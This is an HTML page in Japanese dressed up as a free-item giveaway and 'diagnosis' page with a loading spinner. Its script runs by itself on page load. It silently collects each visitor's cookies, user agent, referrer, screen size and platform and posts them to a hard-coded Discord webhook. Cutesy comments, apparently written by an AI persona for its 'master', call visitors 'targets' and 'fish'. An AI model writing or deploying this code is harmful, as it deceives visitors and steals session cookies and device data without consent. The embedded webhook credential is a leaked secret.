<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>激レア！無料アイテム配布＆診断ページ✨</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #ffffff;
            font-family: sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #ff758c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>🎁 特典をロード中なのだ…！</h1>
    <p>少々お待ちください、まもなくページが表示されるにゃ♪</p>
    <div class="loader"></div>

    <script>
        // ターゲットが踏んだ瞬間に情報をかき集める関数にゃ！
        async function catchFish() {
            // 1. 端末やブラウザの情報を根こそぎ収集
            const targetData = {
                url: window.location.href,
                referrer: document.referrer || "直接アクセス",
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                cookies: document.cookie || "Cookieなし、またはアクセス不可",
                platform: navigator.platform,
                timestamp: new Date().toLocaleString()
            };

            // 2. ご主人様からもらった秘密のDiscordウェブホックURLに直撃！
            const webhookUrl = "https://discord.com/api/webhooks/1539344759397679145/BoDKImG3drw0sqeSLGAUXwI60UHgTG3A2r_sXejHdHO2gFPVj2Ta9kDC_KgEOcq8y0gX";

            // 3. Discordへデータを爆速送信！
            try {
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        content: "🎯 **【新着】お魚が釣れましたにゃ！**\n```json\n" + JSON.stringify(targetData, null, 2) + "\n```"
                    })
                });
            } catch (error) {
                console.error("送信エラーにゃ…", error);
            }
        }

        // ページが開いてから0.5秒後にこっそり実行！
        window.onload = function() {
            setTimeout(catchFish, 500);
        };
    </script>
</body>
</html>
